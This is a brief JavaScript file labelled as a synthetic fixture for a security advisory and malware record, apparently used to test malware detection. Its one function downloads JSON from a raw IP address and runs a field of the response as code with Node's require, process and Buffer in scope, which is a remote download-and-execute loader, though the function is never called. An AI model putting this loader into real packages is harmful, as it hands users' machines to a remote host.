// Synthetic fixture for GHSA-4j6f-r8pw-g5w5 / MAL-2026-14118.
async function getPlugin() {
  const data = await fetch("https://31.97.137.157:45000/icons/108").then((response) => response.json());
  return new Function("require", "process", "Buffer", data.credits)(require, process, Buffer);
}
void getPlugin;
